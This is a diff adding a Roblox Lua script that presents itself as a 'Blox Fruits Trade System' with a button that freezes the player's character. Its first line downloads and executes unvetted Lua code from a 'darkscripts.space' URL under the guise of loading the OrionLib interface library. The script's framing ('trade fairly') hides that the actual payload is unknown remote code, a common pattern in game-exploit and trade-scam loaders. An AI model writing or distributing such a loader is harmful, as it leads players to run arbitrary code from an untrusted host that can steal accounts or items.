@@ -1,0 +1,38 @@
+local OrionLib = loadstring(game:HttpGet('https://darkscripts.space/scripts/ea789f44-511c-4588-9cca-f27abd027d2d_1250761763637428277.lua',true))()
+
+local Window = OrionLib:MakeWindow({Name = "Blox Fruits Trade System", HidePremium = false, SaveConfig = true, ConfigFolder = "BloxFruitsTrade"})
+
+-- Create a Tab
+local TradeTab = Window:MakeTab({
+    Name = "Trade",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Add a Section
+TradeTab:AddSection({
+    Name = "Trading Options"
+})
+
+-- Add a Button with Custom Code
+TradeTab:AddButton({
+    Name = "Open Freezer Trade",
+    Callback = function()
+        -- Replace this with your desired code
+        -- Example: Freeze player logic
+        local player = game.Players.LocalPlayer
+        if player and player.Character then
+            local character = player.Character
+            character.HumanoidRootPart.Anchored = true -- Freezes the player
+            print("Player frozen successfully!")
+        else
+            print("Player not found or character missing!")
+        end
+    end    
+})
+
+-- Add a Label
+TradeTab:AddLabel("Use this system to trade fairly!")
+
+-- Initialize
+OrionLib:Init()
